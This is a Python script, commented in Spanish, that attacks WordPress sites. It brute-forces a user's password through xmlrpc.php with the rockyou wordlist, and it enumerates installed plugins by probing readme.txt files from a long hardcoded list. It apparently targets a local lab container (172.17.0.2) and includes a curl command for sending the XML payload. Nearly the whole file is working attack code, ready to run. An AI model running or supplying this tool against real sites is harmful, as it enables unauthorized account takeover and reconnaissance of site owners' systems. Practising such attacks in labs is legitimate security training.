import requests
import signal
from tqdm import tqdm

# Recogemos la salida con ctrl + C
def salir(sig, frame):
    exit()

signal.signal(signal.SIGINT, salir)

class Herramienta:
    def __init__(self, url_xmlrpc, usuario, rockyou, url_plugin, listado_plugins):
        self.url_xmlrpc = url_xmlrpc
        self.usuario = usuario
        self.rockyou = rockyou
        self.url_plugin = url_plugin
        self.listado_plugins = listado_plugins
        
    def ataque_fuerza(self):
        # Abrimos rockyou.txt como diccionario y leemos cada linea
        with open(self.rockyou, 'r', encoding='latin-1') as diccionario:
            list_passwords = diccionario.readlines()

        pbar = tqdm(list_passwords, desc="Atacando WordPress", unit="pw")

        for each_password in pbar:
            # Limpiamos los espacios
            each_password = each_password.strip()

            # El payload que usamos en cada vuelta para realizar la consulta
            # Lo he sacado de una plantilla en xmlrpc php servebolt 
            payload = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
            <param><value>{self.usuario}</value></param>
            <param><value>{each_password}</value></param>
            </params>
            </methodCall>
            """

            pbar.write(f"[*] Probando con: {each_password}")

            # Esta es la respuesta que hacemos con la estructura del payload como dato y la url
            respuesta = requests.post(self.url_xmlrpc, data=payload, allow_redirects=False)

            # Realmente puedes poner cualquier texto que veas al introducir mal un usuario y contraseña
            # El error es: Nombre de usuario o contraseña incorrectos.
            # Previamente montamos la plantilla y usamos 
            # curl -X POST http://172.17.0.2/wordpress/xmlrpc.php -d@xmlrpc.xml

            if 'contraseña incorrectos' not in respuesta.text:
                print(f"Contraseña correcta: {each_password}")
                exit()

    def listar_plugins(self):
        for plugin in self.listado_plugins:
            ataque = f"{self.url_plugin}{plugin}/readme.txt"
            print(ataque)

            respuesta = requests.get(ataque)

            if respuesta.status_code == 200:
                print("Existe el plugin " + plugin)
                print("Debes insertar esta url ")
                print(ataque)

            else:
                pass

# Incluimos todos los plugins que queramos comprobar (si no está en esta tupla, no lo va a encontrar)
listado_plugins = (
    "jetpack",
    "akismet",
    "contact-form-7",
    "woocommerce",
    "wordfence",
    "yoast-seo",
    "elementor",
    "w3-total-cache",
    "updraftplus",
    "wpforms",
    "all-in-one-seo-pack",
    "google-analytics-for-wordpress",
    "really-simple-ssl",
    "wordfence-security",
    "classic-editor",
    "disable-comments",
    "smush",
    "mailchimp-for-wp",
    "redirection",
    "shortpixel-image-optimizer",
    "duplicate-post",
    "monsterinsights",
    "tablepress",
    "ninja-forms",
    "wp-optimize",
    "broken-link-checker",
    "cookie-notice",
    "advanced-custom-fields",
    "the-events-calendar",
    "easy-wp-smtp",
    "seo-press",
    "elementor-pro",
    "rank-math",
    "wp-rocket",
    "bbpress",
    "buddypress",
    "wp-super-cache",
    "mailpoet",
    "yoast-seo-premium",
    "ultimate-member",
    "woocommerce-subscriptions",
    "wp-job-manager",
    "regenerate-thumbnails",
    "revslider",
    "revive-old-post",
    "wp-fastest-cache",
    "simple-301-redirects",
    "wordfence-login-security",
    "wp-smush-pro",
    "ithemes-security",
    "nextgen-gallery",
    "wp-migrate-db",
    "duplicator",
    "really-simple-captcha",
    "autoptimize",
    "social-media-widget",
    "add-to-any",
    "disqus-comment-system",
    "broken-link-manager",
    "pretty-link",
    "simple-tags",
    "advanced-excerpt",
    "better-click-to-tweet",
    "wp-polls",
    "wordpress-popular-posts",
    "ad-inserter",
    "wp-mail-smtp",
    "easy-digital-downloads",
    "give",
    "loco-translate",
    "bbpress",
    "buddypress",
    "sucuri-scanner",
    "envira-gallery",
    "soliloquy",
    "my-calendar",
    "wp-google-maps",
    "custom-post-type-ui",
    "members",
    "query-monitor",
    "theme-check",
    "user-role-editor",
    "woocommerce-gateway-stripe",
    "woocommerce-services",
    "yith-woocommerce-wishlist",
    "yith-woocommerce-compare",
    "simple-share-buttons-adder",
    "the-events-calendar-pro",
    "under-construction-page",
    "wp-optimize-premium",
    "backupbuddy",
    "wp-all-import",
    "wp-offload-media",
    "wp-all-export",
    "ultimate-social-media-icons",
    "real-cookie-banner",
    "litespeed-cache",
    "loginizer",
    "under-construction",
    "wp-maintenance-mode",
    "hummingbird-performance",
    "push-engage",
    "easy-social-share-buttons",
    "post-smtp",
    "advanced-custom-fields-pro",
    "google-site-kit",
    "amp",
    "autoptimize",
    "better-wp-security",
    "blubrry-powerpress",
    "contact-form-7-datepicker",
    "easy-affiliate-links",
    "easy-theme-and-plugin-upgrades",
    "insert-headers-and-footers",
    "mc4wp-mailchimp-for-wordpress",
    "post-types-order",
    "restrict-content-pro",
    "simple-history",
    "simple-local-avatars",
    "simple-sitemap",
    "simple-social-icons",
    "smush-pro",
    "social-icons-widget-by-wpzoom",
    "the-events-calendar-shortcode",
    "the-seo-framework",
    "updraftplus-premium",
    "wp-cfm",
    "wp-rollback",
    "wp-user-avatar",
    "wp-user-frontend",
    "yith-woocommerce-ajax-search",
    "yith-woocommerce-ajax-product-filter",
    "yith-woocommerce-quick-view",
    "yith-woocommerce-request-a-quote",
    "yith-woocommerce-catalog-mode",
    "yith-woocommerce-badge-management",
    "yith-woocommerce-compare",
    "yith-woocommerce-featured-video",
    "yith-woocommerce-questions-and-answers",
    "yith-woocommerce-product-bundles",
    "yith-woocommerce-product-gallery-magnifier",
    "yith-woocommerce-tab-manager",
    "yith-woocommerce-wishlist",
    "yoast-comment-hacks",
    "wordfence-central",
    "wp-mail-bank",
    "wp-multibyte-patch",
    "wp-photo-album-plus",
    "wp-postratings",
    "wp-recipe-maker",
    "wp-review",
    "wp-simple-firewall",
    "wp-staging",
    "wp-statistics",
    "wp-super-cache",
    "wp-to-buffer",
    "wp-to-twitter",
    "wp-tune-up",
    "wp-ulike",
    "wp-useronline",
    "wp-webhooks",
    "wp-whatsapp-button",
    "wp-whatsapp-chat",
    "wp-wpbakery-page-builder",
    "wpcf7-mailchimp-extension",
    "wpcf7-redirect",
    "wpcf7-recaptcha",
    "wpcf7-submission",
    "wpcf7-to-database-extension",
    "wpcf7-wpml",
    "wpeverest-user-registration",
    "wpforms-constant-contact",
    "wpforms-drip",
    "wpforms-form-abandonment",
    "wpforms-mailchimp",
    "wpforms-marketing-campaigns",
    "wpforms-uploads",
    "wpml-translation-management",
    "wp-offload-s3",
    "wp-offload-ses",
    "wpmudev-upfront-builder",
    "wpmudev-snapshot",
    "wpmudev-smartcrawl",
    "wpmudev-marketpress",
    "wpmudev-bp-activity",
    "wpmudev-bp-group-calendar",
    "wpmudev-bp-group-documents",
    "wpmudev-bp-group-email",
    "wpmudev-bp-group-hierarchy",
    "wpmudev-bp-group-organizer",
    "wpmudev-bp-groupblog",
    "wpmudev-bp-links",
    "wpmudev-bp-livestream",
    "wpmudev-bp-lockdown",
    "wpmudev-bp-mass-messaging",
    "wpmudev-bp-polls",
    "wpmudev-bp-privacy",
    "wpmudev-bp-simple-events",
    "wpmudev-bp-social",
    "wpmudev-bp-social-media",
    "wpmudev-bp-translate",
    "wpmudev-bp-twitter",
    "wpmudev-bp-user-profile-completion",
    "wpmudev-bp-user-profile-fields",
    "wpmudev-bp-user-profile-visibility",
    "wpmudev-bp-user-status",
    "wpmudev-bp-xprofile-custom-fields",
    "wpmudev-coursepress",
    "wpmudev-dashboard",
    "wpmudev-defender",
    "wpmudev-domain-mapping",
    "wpmudev-edd-pushover",
    "wpmudev-e-newsletter",
    "wpmudev-events-plus",
    "wpmudev-facebook",
    "wpmudev-friends",
    "wpmudev-gridbuilder",
    "wpmudev-hivepress",
    "wpmudev-hummingbird",
    "wpmudev-infinite-sessions",
    "wpmudev-login-safety",
    "wpmudev-membership",
    "wpmudev-membership-premium",
    "wpmudev-membership-ultimate",
    "wpmudev-membership2",
    "wpmudev-multisite-privacy",
    "wpmudev-pro-sites",
    "wpmudev-qa",
    "wpmudev-qtranslate-x",
    "wpmudev-reports",
    "wpmudev-saml",
    "wpmudev-saml-service-provider",
    "wpmudev-simple-css",
    "wpmudev-single-sign-on",
    "wpmudev-smartsso",
    "wpmudev-support",
    "wpmudev-support-system",
    "wpmudev-tips",
    "wpmudev-tutoring",
    "wpmudev-unlimited-smtp",
    "wpmudev-upfront",
    "wpmudev-upfront-contact",
    "wpmudev-upfront-media",
    "wpmudev-upfront-parallax",
    "wpmudev-upfront-portfolio",
    "wpmudev-upfront-posts",
    "wpmudev-upfront-starter",
    "wpmudev-upfront-studio",
    "wpmudev-upfront-symbiostock",
    "wpmudev-upfront-widgets",
    "wpmudev-user-blogs",
    "wpmudev-widgets-for-sitebuilder",
    "wpmudev-wp-blogandplugin",
    "wpmudev-wp-user-control",
    "wpmudev-wp-usercontrol",
    "wpmudev-wpmudev",
    "wpmudev-wunderplugin",
    "wp-optimize-premium"
    "revslider",
    "visual-composer",
    "wp-statistics",
    "userpro",
    "gravityforms",
    "all-in-one-wp-migration",
    "duplicator",
    "wpfastestcache",
    "ninja-forms",
    "wordfence",
    "wp-file-manager",
    "file-manager",
    "file-manager-advanced",
    "download-manager",
    "wp-easycart",
    "wp-ultimate-csv-importer",
    "wp-job-manager",
    "wpdiscuz",
    "wordfence",
    "formidable",
    "brizy",
    "site-editor",
    "wpdatatables",
    "members",
    "real-estate-7",
    "wp-mail-smtp",
    "woo-gutenberg-products-block",
    "essential-addons-for-elementor-lite",
    "paid-memberships-pro",
    "wp-customer-area",
    "slider-hero",
    "simple-301-redirects",
    "yith-woocommerce-gift-cards",
    "wpmu-dev-facebook",
    "wpmu-dev-chat",
    "wpmu-dev-defender",
    "wpmu-dev-dashboard",
    "wpmu-dev-forminator",
    "wpmu-dev-membership-2",
    "wpmu-dev-hummingbird",
    "wpmu-dev-ibbu",
    "wpmu-dev-mailchimp",
    "wpmu-dev-snapshot",
    "wpmu-dev-support",
    "wpmu-dev-upfront",
    "wpmu-dev-vc-templating",
    "wpmu-dev-videopress",
    "wpmu-dev-wp-forminator"
)

url_xmlrpc = 'http://172.17.0.2/wordpress/xmlrpc.php'
usuario = 'luisillo'
# Variable rockyou.txt
rockyou = 'rockyou.txt'
url_plugin = 'http://172.17.0.2/wp-content/plugins/'

# Crear objeto Herramienta con todas las variables
objeto_ataque = Herramienta(url_xmlrpc, usuario, rockyou, url_plugin, listado_plugins)

eleccion = input("Introduce 1 para fuerza bruta o 2 para listar plugins activos en la web victima: ")

if eleccion == "1":
    objeto_ataque.ataque_fuerza()
    
elif eleccion == "2":
    objeto_ataque.listar_plugins()

else:
    print("Introduce solo una eleccion 1 o 2")